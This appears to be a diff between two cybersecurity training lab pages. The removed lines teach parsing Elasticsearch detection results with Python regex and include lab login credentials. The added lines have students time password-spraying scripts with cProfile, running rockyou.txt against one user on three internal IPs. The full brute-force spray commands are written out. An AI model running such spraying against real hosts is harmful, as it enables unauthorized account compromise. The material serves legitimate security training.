-The search result prints only the FQDNs that meet the criteria in the code. These results indicate that the search is case-sensitive. 
-
-﻿
-
-4. Ignore casing in the search results by adding re.IGNORECASE to the argument and executing the search, again, as follows:
-
-for i in df['systems'].unique():
-    wkstn_hunt = re.search("wkstn", i, re.IGNORECASE)
-    if wkstn_hunt:
-        print("Discovered " + i)
-﻿
-
-This results in the regular expression search and filtering provide the most accurate results, according to the search criteria.
-
-
-Using Python Data Parsing Functions
-Python Data Parsing
-﻿
-
-Parse and filter data from Elasticsearch query results.
+Continue working in a terminal in kali-hunt. Compare different methods for completing a brute force attack to determine the fastest method. Attempt each attack by brute forcing multiple passwords against multiple hosts. Determine the runtime of each algorithm.
 
 ﻿
 
 Workflow
 ﻿
 
-1. Log in to the VM lin-hunt-cent with the credentials below:
+1. Run each script by entering the following, allowing 5 minutes to complete:
 
-Username: trainee
-Password: CyberTraining1!
+python3 -m cProfile ./sprayer.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script1results.txt
+
+python3 -m cProfile ./sprayer2.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script2results.txt
 ﻿
 
-2. Open the notebook Lab3 in Jupyter Notebook.
+2. Display the results of each script with the following commands. 
 
+head script1results.txt
+head script2results.txt
 ﻿
 
-3. Ensure the notebook displays the correct Elasticsearch query results by running each block of code independently, starting from the top, and comparing them to the target output in Figure 13.4-15, below:
-
-﻿
-
-﻿
-
-Figure 13.4-15
-
-﻿
-
-The column message in the Elasticsearch results displays less information than the data displayed in the output. This is because the data string is truncated to easily fit in the window at the expense of visibility.
-
-﻿
-
-4. Expand the truncated data string by entering and executing the following lines of code in the empty cell below the Elasticsearch query results:
-
-pd.options.display.max_rows
-pd.set_option('display.max_colwidth', None)
-
-df['message'].head(1)
-﻿
-
-Figure 13.4-16, below, displays the data in this expanded string. The string starts with information such as a MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) technique Identifier (ID) and name. This may be valuable information for analysts to refer back to and output as an alert.
+Figure 14.1-2, below, highlights where the algorithm runtime is listed in each output.
 
 ﻿
 
 ﻿
 
-Figure 13.4-16
+Figure 14.1-2﻿
 
 ﻿
 
-5. Parse the information from the first entry in message by entering and executing the following lines of code:
-
-import re
-df['message'] = df['message'].astype(str)
-
-for i in df['message'].head(1):
-    attkID = re.findall(r'technique\_id\=(.*?)\,', i)
-    if attkID:
-        attkName = re.findall(r'technique\_name\=(.*?)\n', i)
-        print(attkID[0], attkName[0])
-﻿
-
-This outputs the following string:
-
-T1055.001 Dynamic-link Library Injection.
-﻿
-
-These results are useful for displaying information about the detected technique. However, the full string in the message column does not reveal a system name.
+It is possible that Python has optimized processes in the background, leading to very similar results between the scripts. The link in the Additional Resource section of this task provides additional tests to complete. Regardless, these two labs highlight the effect a small amount of tuning has in the performance of Python on large scales. This is relevant to both attackers and defenders who may use Python to accomplish tasks across a whole network.
 
 ﻿
 
-6. Include data from the column observer by editing and executing the following code block:
-
-import re
-df['message'] = df['message'].astype(str)
-df['observer'] = df['observer'].astype(str)
-
-index = 0
-for i in df['message'].head():
-    attkID = re.findall(r'technique\_id\=(.*?)\,', i)
-    if attkID:
-        attkName = re.findall(r'technique\_name\=(.*?)\n', i)
-        system = re.findall(r'\'(.+?)\'', df['observer'][index])
-        print(attkID[0], attkName[0], "discovered on system", system[1])
-    index += 1
-﻿
-
-This code block uses two different indexes. In the for loop, the index variable i contains a value from a string in the column message. This makes it safe to perform the regular expression logic against the value i. However, when the column observer is referenced, the value i cannot be used as an index because it is a string and not a reference to the row. Instead, this block of code uses a separate variable, index, which increases by one through each iteration of i. This allows the print statement to reference the correct system name. Figure 13.4-17, below, displays the output:
+Additional Resource
+Python Profilers: https://docs.pyth on.org/3/li brary/profile.html
 
 ﻿
 
-﻿
 
-Figure 13.4-17
 
-Click "Finish" to exit the event.
-Auto-Advance on Correct
 
 
 
